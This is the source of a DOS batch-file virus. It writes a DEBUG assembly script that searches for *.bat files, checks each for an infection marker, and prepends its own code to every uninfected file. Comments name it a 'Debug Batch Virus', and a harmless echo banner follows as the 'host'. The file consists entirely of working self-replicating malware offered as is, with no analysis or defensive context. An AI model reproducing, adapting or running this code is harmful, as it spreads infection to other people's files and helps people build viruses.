@echo off
goto viru$0
a 100
jmp 114

e 103 "*.bat",0
e 109 "$elf",0
a 114
mov dx,109
mov ax,3d00
int 21
xchg bx,ax
mov ah,3f
mov cx,30e
mov dx,1000
int 21
mov ah,4e
mov cl,20
mov dx,103
int 21
jc 186
mov dx,9e
mov ax,3d00
int 21
xchg bx,ax
mov ah,3f
mov cx,A000
mov dx,6000
int 21
mov word [di+900],ax
cmp word [di+601B],3030
je 180
mov dx,9e
mov ax,3d01
int 21
xchg bx,ax
mov ah,40
mov cx,30e
mov dx,1000
int 21
mov ah,40
mov cx, [di+900]
mov dx,6000
int 21
mov ah,3e
int 21
jmp 186

a 180
mov ah,4f
int 21
jnb 132
ret

g
q
:viru$0
if exist %0 copy %0 $elf>nul
if exist %0.bat copy %0.bat $elf>nul
if not exist $elf goto viru$1
debug<$elf>nul
del $elf
:viru$1
:: (hehe) Debug Batch Virus
::  and here's your host...
@echo off  
echo ----------------------
echo Debug-script BAT virus
echo ----------------------
